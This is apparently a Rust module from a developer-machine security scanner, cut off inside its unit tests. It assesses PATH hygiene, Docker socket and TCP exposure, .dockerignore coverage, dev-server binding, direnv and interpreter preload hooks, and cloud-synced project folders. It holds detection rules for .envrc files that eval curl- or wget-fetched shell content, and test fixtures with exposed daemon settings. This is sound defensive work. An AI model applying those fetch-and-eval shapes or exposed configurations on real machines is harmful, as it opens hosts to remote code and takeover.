//! Local-environment posture: PATH integrity, Docker daemon exposure, image
//! pinning, build-context leaks, dev-server binding, direnv auto-execution,
//! interpreter preload hooks, and projects living in cloud-synced trees.

use super::{
    ControlAssessment, ControlContext, ControlStatus, Evidence, assessment, evidence, file_mode,
    finding_evidence, home, matching_rules, project_roots, read_text, rule_control, shell_rc_files,
    tool_on_path,
};
use crate::model::Finding;
use crate::scan::checks::util::is_dockerfile_name;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

// ---------------------------------------------------------------------------
// path-hygiene
// ---------------------------------------------------------------------------

/// `$PATH` search-order integrity (CWE-426/427). Unlike every other probe this
/// one reads the process environment: `$PATH` is live process state with no
/// authoritative on-disk location, so the report's home cannot stand in for it.
pub(super) fn path_hygiene(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "path-hygiene";
    #[cfg(unix)]
    {
        let Some(path_var) = std::env::var_os("PATH") else {
            return assessment(
                ID,
                ControlStatus::Unknown,
                vec![evidence(
                    "PATH is not set in this process, so search order cannot be assessed",
                    None,
                )],
                Vec::new(),
            );
        };
        let path_var = path_var.to_string_lossy();
        let user_uid = home(ctx).and_then(owner_uid);
        let problems = path_problems(&path_var, user_uid);
        if problems.is_empty() {
            return assessment(
                ID,
                ControlStatus::Passed,
                vec![evidence(
                    "Every PATH entry is an absolute directory writable only by you or root",
                    None,
                )],
                Vec::new(),
            );
        }
        assessment(ID, ControlStatus::Failed, problems, Vec::new())
    }
    #[cfg(not(unix))]
    {
        let _ = ctx;
        assessment(
            ID,
            ControlStatus::Unknown,
            vec![evidence(
                "PATH directory ownership and modes are not readable on this platform",
                None,
            )],
            Vec::new(),
        )
    }
}

#[cfg(unix)]
fn owner_uid(path: &Path) -> Option<u32> {
    use std::os::unix::fs::MetadataExt;
    Some(std::fs::metadata(path).ok()?.uid())
}

#[cfg(unix)]
fn path_problems(path_var: &str, user_uid: Option<u32>) -> Vec<Evidence> {
    let mut problems = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let mut push = |problems: &mut Vec<Evidence>, summary: String, path: Option<PathBuf>| {
        if seen.insert(summary.clone()) {
            problems.push(evidence(summary, path));
        }
    };
    for entry in path_var.split(':') {
        if entry.is_empty() {
            push(
                &mut problems,
                "PATH contains an empty element (a leading, trailing, or doubled colon), which the shell searches as the current directory".to_string(),
                None,
            );
            continue;
        }
        if entry == "." || entry == ".." {
            push(
                &mut problems,
                format!(
                    "PATH contains `{entry}`: a command typed inside a hostile repository can resolve to its files"
                ),
                None,
            );
            continue;
        }
        let dir = Path::new(entry);
        if dir.is_relative() {
            push(
                &mut problems,
                format!(
                    "PATH entry {entry} is relative, so its meaning changes with the current directory"
                ),
                None,
            );
            continue;
        }
        // A nonexistent entry resolves nothing and is skipped.
        let Some(mode) = file_mode(dir) else { continue };
        if mode & 0o002 != 0 {
            push(
                &mut problems,
                format!(
                    "PATH entry {entry} is world-writable; anyone on the machine can shadow a real tool"
                ),
                Some(dir.to_path_buf()),
            );
        } else if mode & 0o020 != 0 {
            push(
                &mut problems,
                format!(
                    "PATH entry {entry} is group-writable; group members can shadow a real tool"
                ),
                Some(dir.to_path_buf()),
            );
        }
        if let (Some(user), Some(owner)) = (user_uid, owner_uid(dir))
            && owner != user
            && owner != 0
        {
            push(
                &mut problems,
                format!("PATH entry {entry} is owned by uid {owner}, neither you nor root"),
                Some(dir.to_path_buf()),
            );
        }
    }
    problems
}

// ---------------------------------------------------------------------------
// docker-socket-exposure
// ---------------------------------------------------------------------------

/// The Docker daemon handed to something other than the local root-equivalent
/// user: a socket mount or privileged service in a scanned compose file, or a
/// `DOCKER_HOST=tcp://` shell configuration without TLS verification.
pub(super) fn docker_socket(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "docker-socket-exposure";
    let findings = matching_rules(ctx.report, &["docker-socket-mount", "compose-privileged"]);
    let mut problems: Vec<Evidence> = findings
        .iter()
        .map(|finding| finding_evidence(finding))
        .collect();

    if let Some(home_dir) = home(ctx) {
        let rc_files = shell_rc_files(home_dir);
        let tls_verified = rc_files
            .iter()
            .filter_map(|rc| read_text(rc))
            .any(|text| text.contains("DOCKER_TLS_VERIFY=1"));
        if !tls_verified {
            for rc in rc_files {
                let Some(text) = read_text(&rc) else { continue };
                let tcp_host = text.lines().any(|line| {
                    let trimmed = line.trim_start();
                    !trimmed.starts_with('#')
                        && trimmed.contains("DOCKER_HOST")
                        && trimmed.contains("tcp://")
                });
                if tcp_host {
                    problems.push(evidence(
                        "DOCKER_HOST points at a TCP daemon without DOCKER_TLS_VERIFY=1; anyone who can reach that port has root on that machine",
                        Some(rc),
                    ));
                }
            }
        }
    }

    if !problems.is_empty() {
        return assessment(ID, ControlStatus::Failed, problems, findings);
    }
    let applicable = ctx
        .report
        .packages
        .iter()
        .any(|package| package.ecosystem == "oci")
        || tool_on_path(ctx, "docker");
    if applicable {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "No compose file mounts the Docker socket or runs privileged, and no shell configuration points at an untrusted TCP daemon",
                None,
            )],
            Vec::new(),
        );
    }
    assessment(
        ID,
        ControlStatus::NotApplicable,
        vec![evidence(
            "No Docker or compose configuration was found on this machine",
            None,
        )],
        Vec::new(),
    )
}

// ---------------------------------------------------------------------------
// container-image-pinning
// ---------------------------------------------------------------------------

pub(super) fn image_pinning(ctx: &ControlContext<'_>) -> ControlAssessment {
    let applicable = ctx
        .report
        .packages
        .iter()
        .any(|package| package.ecosystem == "oci");
    rule_control(
        "container-image-pinning",
        ctx.report,
        &["image-unpinned"],
        applicable,
    )
}

// ---------------------------------------------------------------------------
// dockerignore-coverage
// ---------------------------------------------------------------------------

const DOCKERIGNORE_REQUIRED: [&str; 4] = [".env", ".git", "*.pem", "*.key"];

/// Per project root: a Dockerfile that copies the whole build context must sit
/// next to a `.dockerignore` covering dotenv files, `.git`, and key material.
/// Secret-shaped `ARG`/`ENV` literals (`rule:dockerfile-secret`) fail the same
/// control: both bake secrets into published layers.
pub(super) fn dockerignore(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "dockerignore-coverage";
    let secret_findings = matching_rules(ctx.report, &["dockerfile-secret"]);
    let mut problems: Vec<Evidence> = secret_findings
        .iter()
        .map(|finding| finding_evidence(finding))
        .collect();
    let mut surfaces = 0usize;

    for root in project_roots(ctx) {
        for dockerfile in dockerfiles_at(&root) {
            let Some(text) = read_text(&dockerfile) else {
                continue;
            };
            if !copies_whole_context(&text) {
                continue;
            }
            surfaces += 1;
            let ignore_path = root.join(".dockerignore");
            match read_text(&ignore_path) {
                None => problems.push(evidence(
                    "This Dockerfile copies the whole build context with no .dockerignore, so dotenv files and the .git history enter the image",
                    Some(dockerfile),
                )),
                Some(ignore) => {
                    let lines: Vec<&str> = ignore.lines().collect();
                    let missing: Vec<&str> = DOCKERIGNORE_REQUIRED
                        .into_iter()
                        .filter(|target| !ignore_covers(&lines, target))
                        .collect();
                    if !missing.is_empty() {
                        problems.push(evidence(
                            format!(".dockerignore does not cover {}", missing.join(", ")),
                            Some(ignore_path),
                        ));
                    }
                }
            }
        }
    }

    if !problems.is_empty() {
        return assessment(ID, ControlStatus::Failed, problems, secret_findings);
    }
    if surfaces > 0 {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "Every Dockerfile that copies its whole build context sits next to a .dockerignore covering dotenv files, .git, and key material",
                None,
            )],
            Vec::new(),
        );
    }
    assessment(
        ID,
        ControlStatus::NotApplicable,
        vec![evidence(
            "No Dockerfile that copies its whole build context was found",
            None,
        )],
        Vec::new(),
    )
}

fn dockerfiles_at(root: &Path) -> Vec<PathBuf> {
    let Ok(entries) = std::fs::read_dir(root) else {
        return Vec::new();
    };
    entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| {
            path.is_file()
                && path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(is_dockerfile_name)
        })
        .collect()
}

fn copies_whole_context(contents: &str) -> bool {
    contents.lines().any(|line| {
        let mut tokens = line.split_whitespace();
        let Some(first) = tokens.next() else {
            return false;
        };
        if !first.eq_ignore_ascii_case("COPY") && !first.eq_ignore_ascii_case("ADD") {
            return false;
        }
        tokens
            .find(|token| !token.starts_with("--"))
            .is_some_and(|src| src == "." || src == "./")
    })
}

/// Whether any `.dockerignore` line covers `target`. Deliberately literal:
/// exact names and the `.env*` glob, after normalizing `**/`, `./`, and
/// trailing-slash forms.
fn ignore_covers(lines: &[&str], target: &str) -> bool {
    lines.iter().any(|line| {
        let mut pattern = line.trim();
        if pattern.is_empty() || pattern.starts_with('#') || pattern.starts_with('!') {
            return false;
        }
        pattern = pattern.strip_prefix("**/").unwrap_or(pattern);
        pattern = pattern.strip_prefix("./").unwrap_or(pattern);
        pattern = pattern.strip_suffix("/**").unwrap_or(pattern);
        pattern = pattern.strip_suffix('/').unwrap_or(pattern);
        match target {
            ".env" => pattern == ".env" || pattern == ".env*",
            _ => pattern == target,
        }
    })
}

// ---------------------------------------------------------------------------
// dev-server-binding
// ---------------------------------------------------------------------------

/// Dev servers reachable beyond loopback: `--host`/`server.host` findings,
/// `OLLAMA_HOST=0.0.0.0` in a shell rc, and (as softer evidence) tunnel
/// configuration files on disk.
pub(super) fn dev_server_binding(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "dev-server-binding";
    let findings = matching_rules(ctx.report, &["dev-server-all-interfaces"]);
    let mut problems: Vec<Evidence> = findings
        .iter()
        .map(|finding| finding_evidence(finding))
        .collect();
    let mut tunnels: Vec<Evidence> = Vec::new();

    if let Some(home_dir) = home(ctx) {
        for rc in shell_rc_files(home_dir) {
            let bound = read_text(&rc).is_some_and(|text| {
                text.lines().any(|line| {
                    let trimmed = line.trim_start();
                    !trimmed.starts_with('#')
                        && trimmed.contains("OLLAMA_HOST")
                        && trimmed.contains("0.0.0.0")
                })
            });
            if bound {
                problems.push(evidence(
                    "OLLAMA_HOST binds the Ollama API to every interface in this shell configuration",
                    Some(rc),
                ));
            }
        }
        for relative in [".config/ngrok/ngrok.yml", ".ngrok2/ngrok.yml"] {
            let config = home_dir.join(relative);
            if config.is_file() {
                tunnels.push(evidence(
                    "An ngrok configuration exists. A config file is not proof a tunnel is running, but a tunnel left up exposes a dev server publicly for as long as the process lives",
                    Some(config),
                ));
            }
        }
        if let Ok(entries) = std::fs::read_dir(home_dir.join(".cloudflared"))
            && let Some(credential) = entries
                .filter_map(Result::ok)
                .map(|entry| entry.path())
                .find(|path| path.extension().is_some_and(|ext| ext == "json"))
        {
            tunnels.push(evidence(
                "A cloudflared tunnel credential exists. A config file is not proof a tunnel is running, but a tunnel left up exposes a dev server publicly for as long as the process lives",
                Some(credential),
            ));
        }
    }

    if !problems.is_empty() {
        problems.extend(tunnels);
        return assessment(ID, ControlStatus::Failed, problems, findings);
    }
    if !tunnels.is_empty() {
        return assessment(ID, ControlStatus::Partial, tunnels, Vec::new());
    }
    assessment(
        ID,
        ControlStatus::Passed,
        vec![evidence(
            "No script, config, or shell rc binds a dev server to all interfaces",
            None,
        )],
        Vec::new(),
    )
}

// ---------------------------------------------------------------------------
// direnv-auto-exec
// ---------------------------------------------------------------------------

/// direnv runs a repository's `.envrc` (arbitrary shell) on `cd`. The trust
/// decision is the allow list, one file per approved `.envrc`, so the probe
/// reads exactly that list and cross-references the scanned projects.
pub(super) fn direnv_auto_exec(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "direnv-auto-exec";
    let envrcs: Vec<PathBuf> = project_roots(ctx)
        .iter()
        .map(|root| root.join(".envrc"))
        .filter(|path| path.is_file())
        .collect();
    if envrcs.is_empty() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence(
                "No .envrc files were found in the scanned projects",
                None,
            )],
            Vec::new(),
        );
    }

    let (allowed, allow_dirs) = direnv_allow_list(ctx);
    let layout = if allow_dirs.is_empty() {
        evidence(
            "No direnv allow directory was found, so no .envrc is approved to run",
            None,
        )
    } else {
        evidence(
            format!(
                "direnv allow list read from {}",
                allow_dirs
                    .iter()
                    .map(|dir| dir.display().to_string())
                    .collect::<Vec<_>>()
                    .join(" and ")
            ),
            Some(allow_dirs[0].clone()),
        )
    };

    let mut failed: Vec<Evidence> = Vec::new();
    let mut allowed_benign: Vec<Evidence> = Vec::new();
    let mut unallowed_notes: Vec<Evidence> = Vec::new();
    for envrc in &envrcs {
        let canonical = std::fs::canonicalize(envrc).unwrap_or_else(|_| envrc.clone());
        let danger = read_text(envrc).as_deref().and_then(envrc_danger);
        match (allowed.contains(&canonical), danger) {
            (true, Some(reason)) => failed.push(evidence(
                format!("An allowed .envrc {reason}; direnv runs it on every cd into the directory"),
                Some(envrc.clone()),
            )),
            (true, None) => allowed_benign.push(evidence(
                "This .envrc is allowed and runs on every cd into the directory; its content is currently benign",
                Some(envrc.clone()),
            )),
            (false, Some(reason)) => unallowed_notes.push(evidence(
                format!(
                    "This .envrc {reason} but is not on the allow list; direnv will prompt before running it"
                ),
                Some(envrc.clone()),
            )),
            (false, None) => {}
        }
    }

    if !failed.is_empty() {
        failed.push(layout);
        return assessment(ID, ControlStatus::Failed, failed, Vec::new());
    }
    if !allowed_benign.is_empty() {
        allowed_benign.push(layout);
        return assessment(ID, ControlStatus::Partial, allowed_benign, Vec::new());
    }
    let mut rows = vec![evidence(
        format!(
            "{} .envrc file(s) present and none is approved in the direnv allow list",
            envrcs.len()
        ),
        None,
    )];
    rows.extend(unallowed_notes);
    rows.push(layout);
    assessment(ID, ControlStatus::Passed, rows, Vec::new())
}

/// Canonicalized paths of every allowed `.envrc`, plus which allow layouts were
/// found. Each allow file's content is the path of the approved `.envrc`.
fn direnv_allow_list(ctx: &ControlContext<'_>) -> (HashSet<PathBuf>, Vec<PathBuf>) {
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(home_dir) = home(ctx) {
        candidates.push(home_dir.join(".local/share/direnv/allow"));
        // The pre-2.21 layout, still honored by direnv.
        candidates.push(home_dir.join(".config/direnv/allow"));
    }
    // $XDG_DATA_HOME relocates the allow directory wholesale. Like $PATH it is
    // process state with no on-disk home-relative equivalent to read instead.
    if let Some(xdg) = std::env::var_os("XDG_DATA_HOME") {
        candidates.push(PathBuf::from(xdg).join("direnv/allow"));
    }

    let mut allowed = HashSet::new();
    let mut found_dirs = Vec::new();
    for dir in candidates {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        found_dirs.push(dir);
        for entry in entries.filter_map(Result::ok) {
            let Some(text) = read_text(&entry.path()) else {
                continue;
            };
            let Some(line) = text.lines().find(|line| !line.trim().is_empty()) else {
                continue;
            };
            let path = PathBuf::from(line.trim());
            allowed.insert(std::fs::canonicalize(&path).unwrap_or(path));
        }
    }
    (allowed, found_dirs)
}

/// The shapes that make an `.envrc` dangerous rather than merely an execution
/// surface. Builds on `dangerous_command_reason` (fetch-to-shell, base64,
/// inline eval) with the direnv-specific vectors.
fn envrc_danger(contents: &str) -> Option<String> {
    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if trimmed.starts_with("PATH_add")
            || (trimmed.contains("PATH=")
                && (trimmed.contains("$PWD") || trimmed.contains("=./") || trimmed.contains(":./")))
        {
            return Some("prepends a repository directory to PATH".to_string());
        }
        if let Some(target) = trimmed
            .strip_prefix("source ")
            .or_else(|| trimmed.strip_prefix(". "))
        {
            let target = target.trim().trim_matches('"').trim_matches('\'');
            if !target.starts_with('/') && !target.starts_with('~') && !target.starts_with("$HOME")
            {
                return Some("sources a repository-supplied script".to_string());
            }
        }
        if trimmed.contains("eval")
            && (trimmed.contains("$(") || trimmed.contains('`'))
            && (trimmed.contains("curl") || trimmed.contains("wget"))
        {
            return Some("evaluates fetched shell content".to_string());
        }
        if let Some(reason) = crate::scan::checks::util::dangerous_command_reason(trimmed) {
            return Some(reason.to_string());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// interpreter-injection
// ---------------------------------------------------------------------------

/// Interpreter-level preload hooks: `NODE_OPTIONS --require/--import`,
/// `PYTHONSTARTUP`/`PYTHONPATH` pointed at repo-controlled or world-writable
/// locations, and `sitecustomize.py` / import-carrying `.pth` files planted in
/// project virtualenvs. Bounded on purpose: only named files and virtualenvs
/// directly under a project root are read, never a filesystem walk.
pub(super) fn interpreter_injection(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "interpreter-injection";
    let roots = project_roots(ctx);
    let mut problems: Vec<Evidence> = Vec::new();
    let mut surfaces = 0usize;

    if let Some(home_dir) = home(ctx) {
        for rc in shell_rc_files(home_dir) {
            let Some(text) = read_text(&rc) else { continue };
            surfaces += 1;
            scan_interpreter_env(&text, &rc, &roots, &mut problems);
        }
    }

    for root in &roots {
        if let Ok(entries) = std::fs::read_dir(root) {
            for entry in entries.filter_map(Result::ok) {
                let path = entry.path();
                let name = path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .unwrap_or("");
                if name.starts_with(".env") && name != ".envrc" && path.is_file() {
                    let Some(text) = read_text(&path) else {
                        continue;
                    };
                    surfaces += 1;
                    scan_interpreter_env(&text, &path, &roots, &mut problems);
                }
            }
        }
        let vscode = root.join(".vscode/settings.json");
        if let Some(text) = read_text(&vscode) {
            surfaces += 1;
            if text.contains("NODE_OPTIONS")
                && (text.contains("--require") || text.contains("--import"))
            {
                problems.push(evidence(
                    "Workspace settings inject NODE_OPTIONS with a preload flag into every process started from the integrated terminal",
                    Some(vscode),
                ));
            }
        }
        for venv in [".venv", "venv"] {
            for site_packages in site_packages_dirs(&root.join(venv)) {
                surfaces += 1;
                problems.extend(site_packages_problems(&site_packages));
            }
        }
    }

    if !problems.is_empty() {
        return assessment(ID, ControlStatus::Failed, problems, Vec::new());
    }
    if surfaces > 0 {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "No interpreter preload hooks were found in shell rc files, dotenv files, workspace settings, or project virtualenvs",
                None,
            )],
            Vec::new(),
        );
    }
    assessment(
        ID,
        ControlStatus::NotApplicable,
        vec![evidence(
            "No shell rc files, dotenv files, or project virtualenvs were found to inspect",
            None,
        )],
        Vec::new(),
    )
}

fn scan_interpreter_env(text: &str, path: &Path, roots: &[PathBuf], problems: &mut Vec<Evidence>) {
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('#') {
            continue;
        }
        if trimmed.contains("NODE_OPTIONS")
            && (trimmed.contains("--require") || trimmed.contains("--import"))
        {
            problems.push(evidence(
                "NODE_OPTIONS preloads a module into every node process",
                Some(path.to_path_buf()),
            ));
        }
        if let Some(value) = assigned_value(trimmed, "PYTHONSTARTUP") {
            let target = PathBuf::from(value);
            if points_at_risky(&target, roots) {
                problems.push(evidence(
                    "PYTHONSTARTUP runs a repo-controlled or world-writable file on every Python REPL start",
                    Some(path.to_path_buf()),
                ));
            }
        }
        if let Some(value) = assigned_value(trimmed, "PYTHONPATH") {
            for entry in value.split(':').filter(|entry| !entry.is_empty()) {
                let dir = PathBuf::from(entry);
                if points_at_risky(&dir, roots) {
                    problems.push(evidence(
                        format!(
                            "PYTHONPATH entry {entry} points into a repository or a world-writable directory, so imports resolve there first"
                        ),
                        Some(path.to_path_buf()),
                    ));
                    break;
                }
            }
        }
    }
}

/// The value assigned to `var` on this line (`VAR=...`, `export VAR=...`),
/// unquoted. Fish's space-separated `set -x VAR value` form is not parsed.
fn assigned_value<'a>(line: &'a str, var: &str) -> Option<&'a str> {
    let idx = line.find(var)?;
    let rest = line[idx + var.len()..].strip_prefix('=')?;
    Some(rest.trim().trim_matches('"').trim_matches('\''))
}

fn points_at_risky(path: &Path, roots: &[PathBuf]) -> bool {
    roots.iter().any(|root| path.starts_with(root))
        || file_mode(path).is_some_and(|mode| mode & 0o002 != 0)
}

fn site_packages_dirs(venv: &Path) -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    if let Ok(entries) = std::fs::read_dir(venv.join("lib")) {
        dirs.extend(
            entries
                .filter_map(Result::ok)
                .map(|entry| entry.path())
                .filter(|path| {
                    path.file_name()
                        .and_then(|name| name.to_str())
                        .is_some_and(|name| name.starts_with("python"))
                })
                .map(|path| path.join("site-packages"))
                .filter(|path| path.is_dir()),
        );
    }
    let windows_layout = venv.join("Lib/site-packages");
    if windows_layout.is_dir() {
        dirs.push(windows_layout);
    }
    dirs
}

/// `sitecustomize.py`/`usercustomize.py`, and `.pth` files carrying `import`
/// lines (which Python executes on every interpreter start). The `.pth` files
/// standard tooling plants are allowlisted by name.
fn site_packages_problems(site_packages: &Path) -> Vec<Evidence> {
    const BENIGN_PTH: [&str; 3] = [
        "_virtualenv.pth",
        "distutils-precedence.pth",
        "easy-install.pth",
    ];
    let mut problems = Vec::new();
    let Ok(entries) = std::fs::read_dir(site_packages) else {
        return problems;
    };
    for entry in entries.filter_map(Result::ok) {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|name| name.to_str()) else {
            continue;
        };
        if name == "sitecustomize.py" || name == "usercustomize.py" {
            problems.push(evidence(
                format!("{name} in site-packages executes on every Python interpreter start"),
                Some(path),
            ));
        } else if name.ends_with(".pth")
            && !BENIGN_PTH.contains(&name)
            && !name.starts_with("__editable__")
            && read_text(&path).is_some_and(|text| {
                text.lines()
                    .any(|line| line.trim_start().starts_with("import "))
            })
        {
            problems.push(evidence(
                format!(
                    "{name} carries an import line, which Python executes on every interpreter start"
                ),
                Some(path),
            ));
        }
    }
    problems
}

// ---------------------------------------------------------------------------
// cloud-synced-projects
// ---------------------------------------------------------------------------

/// Whether a scanned project tree lives inside a cloud-synced directory. The
/// provider is not the problem; the point is that untracked files (dotenv
/// files, dropped credentials) upload the moment they are written, so a secret
/// finding inside a synced tree has already left the machine.
pub(super) fn cloud_synced(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "cloud-synced-projects";
    let Some(home_dir) = home(ctx) else {
        return assessment(
            ID,
            ControlStatus::Unknown,
            vec![evidence(
                "The scanned home directory is unknown, so sync locations cannot be resolved",
                None,
            )],
            Vec::new(),
        );
    };
    let synced = synced_roots(home_dir);
    let mut failed: Vec<Evidence> = Vec::new();
    let mut partial: Vec<Evidence> = Vec::new();
    let mut leaks: Vec<&Finding> = Vec::new();
    for root in project_roots(ctx) {
        let Some(sync_root) = synced.iter().find(|sync| root.starts_with(sync)) else {
            continue;
        };
        let secrets_here: Vec<&Finding> =
            ctx.report
                .findings
                .iter()
                .filter(|finding| {
                    finding.rule_id.as_ref().is_some_and(|id| {
                        matches!(id.as_str(), "secret-exposed" | "dotenv-untracked")
                    }) && finding
                        .path
                        .as_ref()
                        .is_some_and(|path| path.starts_with(&root))
                })
                .collect();
        let sync_name = sync_root
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_else(|| sync_root.display().to_string());
        if secrets_here.is_empty() {
            partial.push(evidence(
                format!(
                    "{} lives inside the {sync_name} synced tree; everything in it, including untracked files, uploads automatically",
                    root.display()
                ),
                Some(root.clone()),
            ));
        } else {
            failed.push(evidence(
                format!(
                    "{} is inside the {sync_name} synced tree and contains a plaintext secret; treat that secret as uploaded to a third party and rotate it",
                    root.display()
                ),
                Some(root.clone()),
            ));
            leaks.extend(secrets_here);
        }
    }

    if !failed.is_empty() {
        failed.extend(partial);
        return assessment(ID, ControlStatus::Failed, failed, leaks);
    }
    if !partial.is_empty() {
        return assessment(ID, ControlStatus::Partial, partial, Vec::new());
    }
    assessment(
        ID,
        ControlStatus::Passed,
        vec![evidence(
            "No scanned project lives inside a cloud-synced directory",
            None,
        )],
        Vec::new(),
    )
}

fn synced_roots(home_dir: &Path) -> Vec<PathBuf> {
    let mut roots: Vec<PathBuf> = [
        "Dropbox",
        "Google Drive",
        "Nextcloud",
        "pCloudDrive",
        "Sync",
        // iCloud Drive, including the Desktop/Documents redirect.
        "Library/Mobile Documents",
        // macOS mount point for provider file-sync apps.
        "Library/CloudStorage",
    ]
    .iter()
    .map(|name| home_dir.join(name))
    .collect();
    if let Ok(entries) = std::fs::read_dir(home_dir) {
        roots.extend(
            entries
                .filter_map(Result::ok)
                .map(|entry| entry.path())
                .filter(|path| {
                    path.file_name()
                        .and_then(|name| name.to_str())
                        .is_some_and(|name| name.starts_with("OneDrive"))
                }),
        );
    }
    roots
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::guide::control::report_with_home;
    use crate::model::{PackageRef, ScanReport};
    use std::fs;

    fn ctx<'a>(report: &'a ScanReport) -> ControlContext<'a> {
        ControlContext { report }
    }

    fn oci_package(manifest: &Path) -> PackageRef {
        PackageRef {
            ecosystem: "oci".to_string(),
            name: "docker.io/library/node".to_string(),
            version: "latest".to_string(),
            manifest_path: manifest.to_path_buf(),
            line: None,
        }
    }

    #[cfg(unix)]
    #[test]
    fn path_problems_flags_dot_empty_relative_and_world_writable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let writable = dir.path().join("ww");
        fs::create_dir(&writable).unwrap();
        fs::set_permissions(&writable, fs::Permissions::from_mode(0o777)).unwrap();
        let clean = dir.path().join("bin");
        fs::create_dir(&clean).unwrap();
        fs::set_permissions(&clean, fs::Permissions::from_mode(0o755)).unwrap();

        let path_var = format!(".:relative/bin::{}:{}", writable.display(), clean.display());
        let problems = path_problems(&path_var, None);
        let summaries: Vec<&str> = problems.iter().map(|row| row.summary.as_str()).collect();
        assert_eq!(problems.len(), 4, "{summaries:?}");
        assert!(summaries.iter().any(|s| s.contains("`.`")));
        assert!(summaries.iter().any(|s| s.contains("empty element")));
        assert!(summaries.iter().any(|s| s.contains("relative")));
        assert!(summaries.iter().any(|s| s.contains("world-writable")));

        // The baseline invariant: a clean PATH maps to no problems.
        assert!(path_problems(&clean.display().to_string(), None).is_empty());
    }

    #[test]
    fn docker_socket_fails_on_findings_and_tcp_rc() {
        let dir = tempfile::tempdir().unwrap();
        let mut report = report_with_home(dir.path());
        report.findings.push(
            crate::model::Finding::from_rule("docker-socket-mount")
                .id("t1")
                .at(dir.path().join("docker-compose.yml"), Some(4)),
        );
        let result = docker_socket(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);
        assert_eq!(result.finding_ids, vec!["t1".to_string()]);

        // A TCP daemon in the rc without TLS fails even with no findings.
        let mut report = report_with_home(dir.path());
        fs::write(
            dir.path().join(".bashrc"),
            "export DOCKER_HOST=tcp://10.0.0.2:2375\n",
        )
        .unwrap();
        report.findings.clear();
        let result = docker_socket(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);

        // With TLS verification the same rc passes (docker present).
        fs::write(
            dir.path().join(".bashrc"),
            "export DOCKER_HOST=tcp://10.0.0.2:2376\nexport DOCKER_TLS_VERIFY=1\n",
        )
        .unwrap();
        let mut report = report_with_home(dir.path());
        report.context.package_managers.push("docker".to_string());
        assert_eq!(docker_socket(&ctx(&report)).status, ControlStatus::Passed);
    }

    #[test]
    fn docker_socket_passes_when_applicable_and_clean() {
        let dir = tempfile::tempdir().unwrap();
        let mut report = report_with_home(dir.path());
        report
            .packages
            .push(oci_package(&dir.path().join("Dockerfile")));
        assert_eq!(docker_socket(&ctx(&report)).status, ControlStatus::Passed);

        let report = report_with_home(dir.path());
        assert_eq!(
            docker_socket(&ctx(&report)).status,
            ControlStatus::NotApplicable
        );
    }

    #[test]
    fn image_pinning_follows_findings() {
        let dir = tempfile::tempdir().unwrap();
        let mut report = report_with_home(dir.path());
        report
            .packages
            .push(oci_package(&dir.path().join("Dockerfile")));
        assert_eq!(image_pinning(&ctx(&report)).status, ControlStatus::Passed);

        report.findings.push(
            crate::model::Finding::from_rule("image-unpinned")
                .id("t2")
                .at(dir.path().join("Dockerfile"), Some(1)),
        );
        assert_eq!(image_pinning(&ctx(&report)).status, ControlStatus::Failed);
    }

    #[test]
    fn dockerignore_coverage_states() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("proj");
        fs::create_dir(&root).unwrap();
        fs::write(root.join("Dockerfile"), "FROM node:20\nCOPY . .\n").unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![root.clone()];

        // No .dockerignore at all.
        assert_eq!(dockerignore(&ctx(&report)).status, ControlStatus::Failed);

        // Present but not covering key material.
        fs::write(root.join(".dockerignore"), ".env\nnode_modules\n").unwrap();
        let result = dockerignore(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);
        assert!(result.evidence[0].summary.contains("*.pem"));

        // Full coverage passes (the baseline invariant).
        fs::write(
            root.join(".dockerignore"),
            "**/.env*\n.git/\n*.pem\n*.key\n",
        )
        .unwrap();
        assert_eq!(dockerignore(&ctx(&report)).status, ControlStatus::Passed);

        // A Dockerfile that copies named paths only is not a surface.
        fs::write(root.join("Dockerfile"), "FROM node:20\nCOPY src /app/src\n").unwrap();
        fs::remove_file(root.join(".dockerignore")).unwrap();
        assert_eq!(
            dockerignore(&ctx(&report)).status,
            ControlStatus::NotApplicable
        );
    }

    #[test]
    fn dev_server_binding_states() {
        let dir = tempfile::tempdir().unwrap();
        let report = report_with_home(dir.path());
        assert_eq!(
            dev_server_binding(&ctx(&report)).status,
            ControlStatus::Passed
        );

        // A tunnel config alone is Partial, and the wording hedges.
        fs::create_dir_all(dir.path().join(".config/ngrok")).unwrap();
        fs::write(dir.path().join(".config/ngrok/ngrok.yml"), "version: 2\n").unwrap();
        let result = dev_server_binding(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Partial);
        assert!(result.evidence[0].summary.contains("not proof"));

        // OLLAMA_HOST on all interfaces fails.
        fs::write(
            dir.path().join(".zshrc"),
            "export OLLAMA_HOST=0.0.0.0:11434\n",
        )
        .unwrap();
        assert_eq!(
            dev_server_binding(&ctx(&report)).status,
